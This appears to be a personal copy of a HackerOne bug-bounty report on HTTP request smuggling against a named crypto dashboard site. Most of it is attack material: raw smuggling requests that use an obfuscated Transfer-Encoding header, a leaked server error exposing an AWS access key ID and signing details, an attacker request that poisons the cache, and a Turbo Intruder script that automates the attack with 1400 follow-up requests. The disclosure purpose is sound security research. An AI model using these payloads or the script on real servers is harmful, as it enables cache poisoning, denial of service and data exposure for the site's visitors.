# EXAMPLE REPORT

## **HTTP Smuggling Examples**

**URL: `https://hackerone.com/reports/753939`**

**Tittle: `HTTP SMUGGLING EXPOSED HMAC/DOS`**

### **Request:**

**This code will return a error page and reflect back the hmac key encription type and sensitive details**

```bash
GET /login HTTP/1.1
Host: dashboard.fortmatic.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://dashboard.fortmatic.com/
DNT: 1
Connection: keep-alive
Cookie: ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
 Transfer-Encoding: chunked

0
```

Response:

```bash
HTTP/1.1 403 Forbidden
Content-Type: application/xml
Transfer-Encoding: chunked
Connection: close
Date: Sun, 08 Dec 2019 11:00:51 GMT
Server: AmazonS3
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
Content-Security-Policy: default-src 'self';style-src 'self' 'unsafe-inline'; frame-src https://*.fortmatic.com/ https://fortmatic.github.io/ blob: https://x2.fortmatic.com; img-src 'self' https://*.fortmatic.com/ https://fortmatic.github.io/ https://anima-uploads.s3.amazonaws.com/ https://www.google-analytics.com/ https://stats.g.doubleclick.net/ https://*.githubusercontent.com https://www.google.com/ data:; connect-src 'self' https://*.fortmatic.com/ https://api.segment.io/ https://api.mixpanel.com/ https://api.amplitude.com/; script-src 'self'  https://cdn.segment.com/ https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js https://www.google-analytics.com/analytics.js https://cdn.amplitude.com/; base-uri 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
X-Cache: Error from cloudfront
Via: 1.1 e2deefdf2f2c76b24ee4785b69116006.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: ATL56-C3
X-Amz-Cf-Id: znmHV1cu6phenKt25Mwr0WtHOgrpgrR4FvReDNGyaA2t__4ZCGRdmA==

<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>SignatureDoesNotMatch</Code><Message>The request signature we calculated does not match the signature you provided. Check your key and signing method.</Message><AWSAccessKeyId>AKIAIJKUV7PUHL53M2YQ</AWSAccessKeyId><StringToSign>AWS4-HMAC-SHA256
20191208T110051Z
20191208/us-west-2/s3/aws4_request
7f35f27b1337db0e03780f8a4e47f011a5ae6fa11d0d62f36a953cf9b2021fc1</StringToSign><SignatureProvided>a39151b144736e9967f33fcc5c4e6d5d6221975273efc1bda31661d92ade8658</SignatureProvided><StringToSignBytes>41 57 53 34 2d 48 4d 41 43 2d 53 48 41 32 35 36 0a 32 30 31 39 31 32 30 38 54 31 31 30 30 35 31 5a 0a 32 30 31 39 31 32 30 38 2f 75 73 2d 77 65 73 74 2d 32 2f 73 33 2f 61 77 73 34 5f 72 65 71 75 65 73 74 0a 37 66 33 35 66 32 37 62 31 33 33 37 64 62 30 65 30 33 37 38 30 66 38 61 34 65 34 37 66 30 31 31 61 35 61 65 36 66 61 31 31 64 30 64 36 32 66 33 36 61 39 35 33 63 66 39 62 32 30 32 31 66 63 31</StringToSignBytes><CanonicalRequest>GET
/index.html

content-type:application/x-www-form-urlencoded Transfer-Encoding: chunked
host:dashboard.fortmatic.com.s3.amazonaws.com
x-amz-content-sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
x-amz-date:20191208T110051Z

content-type;host;x-amz-content-sha256;x-amz-date
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</CanonicalRequest><CanonicalRequestBytes>47 45 54 0a 2f 69 6e 64 65 78 2e 68 74 6d 6c 0a 0a 63 6f 6e 74 65 6e 74 2d 74 79 70 65 3a 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 65 64 20 54 72 61 6e 73 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 63 68 75 6e 6b 65 64 0a 68 6f 73 74 3a 64 61 73 68 62 6f 61 72 64 2e 66 6f 72 74 6d 61 74 69 63 2e 63 6f 6d 2e 73 33 2e 61 6d 61 7a 6f 6e 61 77 73 2e 63 6f 6d 0a 78 2d 61 6d 7a 2d 63 6f 6e 74 65 6e 74 2d 73 68 61 32 35 36 3a 65 33 62 30 63 34 34 32 39 38 66 63 31 63 31 34 39 61 66 62 66 34 63 38 39 39 36 66 62 39 32 34 32 37 61 65 34 31 65 34 36 34 39 62 39 33 34 63 61 34 39 35 39 39 31 62 37 38 35 32 62 38 35 35 0a 78 2d 61 6d 7a 2d 64 61 74 65 3a 32 30 31 39 31 32 30 38 54 31 31 30 30 35 31 5a 0a 0a 63 6f 6e 74 65 6e 74 2d 74 79 70 65 3b 68 6f 73 74 3b 78 2d 61 6d 7a 2d 63 6f 6e 74 65 6e 74 2d 73 68 61 32 35 36 3b 78 2d 61 6d 7a 2d 64 61 74 65 0a 65 33 62 30 63 34 34 32 39 38 66 63 31 63 31 34 39 61 66 62 66 34 63 38 39 39 36 66 62 39 32 34 32 37 61 65 34 31 65 34 36 34 39 62 39 33 34 63 61 34 39 35 39 39 31 62 37 38 35 32 62 38 35 35</CanonicalRequestBytes><RequestId>D6ACD16A4B4F1851</RequestId><HostId>R+VilJrBSB5s4ILN8GAc98W5eIh6vZguZp+RPJBg/1QimzpFTvwgbtC/BYiNNmx6m8USBuzLndo=</HostId></Error>
```

### **Attacker Request:**

**This code will cause a cache poisoning in returning error page in the netx user**

```bash
GET /login HTTP/1.1
Host: dashboard.fortmatic.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://dashboard.fortmatic.com/
DNT: 1
Connection: keep-alive
Cookie: ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-length: 4
 Transfer-Encoding: chunked

72
GET / HTTP/1.1
Host: x2.fortmatic.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

## **Impact:**

The miss configuration with the back end cause it to reflect back the error page when the next valid request comes through. This will lead to a DOS serve this error page when visitor view the website. I will work on exploiting this more

**My note:**

This report ofucate the Transfer-Encoding header with a space after the setting

[space]Trasfer-Encoding: chunked

**Turbo:**

```markdown
# if you edit this file, ensure you keep the line endings as CRLF or you'll have a bad time
import re

def queueRequests(target, wordlists):

    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    # This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''GET / HTTP/1.1
Host: x2.fortmatic.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''

    chunk_size = hex(len(prefix)).lstrip("0x")
    attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
    content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
    engine.queue(attack)

    for i in range(1400):
        engine.queue(target.req)
        time.sleep(0.05)

def handleResponse(req, interesting):
    table.add(req)
```